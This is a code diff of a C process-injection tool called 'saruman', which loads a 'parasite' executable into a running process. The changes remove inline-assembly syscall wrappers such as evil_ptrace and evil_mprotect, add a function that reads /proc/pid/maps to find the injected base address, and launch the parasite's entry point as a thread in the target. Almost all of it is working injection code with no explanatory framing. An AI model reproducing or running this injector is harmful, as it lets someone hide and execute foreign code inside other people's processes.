@@ -62,6 +62,7 @@ typedef struct saruman_ctx {
 		size_t executable_len;
 	} bootstrap;
 	struct {
+		uint64_t base_vaddr;
 		uint64_t entry_point;
 	} parasite;
 	bool bootstrap_phase_complete;
@@ -97,8 +98,6 @@ typedef struct saruman_rpc {
  */
 #define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour
 
-
-__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len);
 
 
 __PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr)
@@ -182,51 +181,6 @@ __PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned lo
 	return (void *)ret;
 }
 
-__PAYLOAD_KEYWORDS__ long evil_lseek(long fd, long offset, unsigned int whence)
-{
-	long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov %2, %%rdx\n"
-			"mov $8, %%rax\n"
-			"syscall" : : "g"(fd), "g"(offset), "g"(whence));
-	asm("mov %%rax, %0" : "=r"(ret));
-	return ret;
-
-}
-
-__PAYLOAD_KEYWORDS__ long evil_ptrace(long request, long pid, void *addr, void *data)
-
-{
-	long ret;
-
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov %2, %%rdx\n"
-			"mov %3, %%r10\n"
-			"mov $101, %%rax\n"
-			"syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
-	asm("mov %%rax, %0" : "=r"(ret));
-
-	return ret;
-}
-
-__PAYLOAD_KEYWORDS__ int evil_fstat(long fd, struct stat *buf)
-{
-	long ret;
-
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov $5, %%rax\n"
-			"syscall" : : "g"(fd), "g"(buf));
-	asm("mov %%rax, %0" : "=r"(ret));
-
-	return ret;
-}
-
 __PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
 {
 	long retval;
@@ -257,42 +211,6 @@ __PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned 
 		__RETURN_VALUE__(retval);
 	}
 	__BREAKPOINT__;
-}
-
-__PAYLOAD_KEYWORDS__ int evil_mprotect(void * addr, unsigned long len, int prot)
-{
-	volatile unsigned long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov %2, %%rdx\n"
-			"mov $10, %%rax\n"
-			"syscall" : : "g"(addr), "g"(len), "g"(prot));
-
-	__asm__ volatile("mov %%rax, %0" : "=r"(ret));
-
-}
-
-__PAYLOAD_KEYWORDS__ int SYS_mprotect(void *addr, unsigned long len, int prot)
-{
-	int ret = evil_mprotect(addr, len, prot);
-
-	__RETURN_VALUE__(ret);
-	__BREAKPOINT__;
-}
-
-
-__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len)
-{
-	long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov %2, %%rdx\n"
-			"mov $1, %%rax\n"
-			"syscall" : : "g"(fd), "g"(buf), "g"(len));
-	asm("mov %%rax, %0" : "=r"(ret));
-	return ret;
 }
 
 __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
@@ -724,6 +642,7 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 	}
 
 #if DEBUG
+#if 0
 	if (ctx->bootstrap_phase_complete == true) {
 		int i;
 		char tmp[32];
@@ -735,6 +654,7 @@ bool saruman_remote_call(struct saruman_ctx *ctx, struct saruman_rpc *rpc)
 			printf("%02x", tmp[i] & 0xff);
 		printf("\n");
 	}
+#endif
 #endif
 
 	/*
@@ -874,6 +794,11 @@ bool saruman_find_libc_dlerror(struct saruman_ctx *ctx, uint64_t *value)
 	memcpy(value, &symbol.value, sizeof(uint64_t));
 }
 
+/*
+ * This function removes the PIE flag from DT_FLAGS_1
+ * in the dynamic segment, otherwise dlopen() won't
+ * load the executable.
+ */
 bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
 {
 	elf_dynamic_entry_t d_entry;
@@ -895,10 +820,8 @@ bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
 		}
 	}
 
-	printf("Initializing elf_dynamic_iterator_init\n");
 	elf_dynamic_iterator_init(ctx->elfobj, &d_iter);
 	for (;;) {
-		printf("Calling iterator\n");
 		res = elf_dynamic_iterator_next(&d_iter, &d_entry);
 		if (res == ELF_ITER_DONE)
 			break;
@@ -906,7 +829,6 @@ bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
 			fprintf(stderr, "elf_dynamic_iterator_next failed\n");
 			return false;
 		}
-		printf("tag value: %d\n", d_entry.tag);
 		if (d_entry.tag == DT_FLAGS_1) {
 			uint64_t tval = d_entry.value & ~(uint64_t)DF_1_PIE;
 			if (elf_dynamic_set_value(&d_iter, tval) == false) {
@@ -916,6 +838,41 @@ bool saruman_remove_pie_flag(struct saruman_ctx *ctx)
 			return true;
 		}
 	}
+	return false;
+}
+
+bool saruman_find_injected_base(struct saruman_ctx *ctx)
+{
+	FILE *fp;
+	char path[4096], buf[4096];
+	char *p, *name, *newline;
+
+	name = strrchr(ctx->exec_path, '/');
+	if (name != NULL)
+		name += 1;
+
+	snprintf(path, 4096, "/proc/%d/maps", ctx->task.pid);
+	fp = fopen(path, "r");
+	if (fp == NULL) {
+		perror("fopen");
+		return false;
+	}
+		
+	while (fgets(buf, sizeof(buf), fp) != NULL) {
+		p = strrchr(buf, '/');
+		if (p == NULL)
+			continue;
+		newline = strchr(p + 1, '\n');
+		*newline = '\0';
+		if (strcmp((p + 1), name) == 0) {
+			p = strchr(buf, '-');
+			*p = '\0';
+			ctx->parasite.base_vaddr = strtoul(buf, NULL, 16);
+			fclose(fp);
+			return true;
+		}
+	}
+	fclose(fp);
 	return false;
 }
 
@@ -1023,11 +980,16 @@ int main(int argc, char **argv)
 	saruman_remote_call_init(&rpc, &dlopen_loader, 1024,
 	    dlopen_loader_args, 2);
 	saruman_remote_call(&saruman, &rpc);
-	printf("Entry point before base: %lx\n", elf_entry_point(saruman.elfobj));
-	saruman.parasite.entry_point = rpc.retval + elf_entry_point(saruman.elfobj);
 	
 	saruman_debug("Handle: %p\n", (void *)rpc.retval);
 	printf("Successfully injected executable '%s' into memory\n", argv[2]);
+
+	if (saruman_find_injected_base(&saruman) == false) {
+		fprintf(stderr, "Failed to find base address of injected: %s\n", argv[2]);
+		exit(EXIT_FAILURE);
+	}
+	saruman.parasite.entry_point = saruman.parasite.base_vaddr + elf_entry_point(saruman.elfobj);
+	printf("Entry point of parasite: %#lx\n", saruman.parasite.entry_point);
 
 	/*
 	 * If debug is on then call dlerror to see why dlopen is failing
@@ -1056,7 +1018,6 @@ int main(int argc, char **argv)
 	    (char *)saruman.parasite.entry_point, saruman.stack.rsp);
 
 	char *pthread_args[] = {(char *)saruman.parasite.entry_point, NULL, (char *)saruman.stack.rsp};
-
 	saruman_remote_call_init(&rpc, &create_thread, 1024, pthread_args, 3);
 	if (saruman_remote_call(&saruman, &rpc) == false) {
 		fprintf(stderr, "saruman_remote_call() failed on a remote call to create_thread()\n");
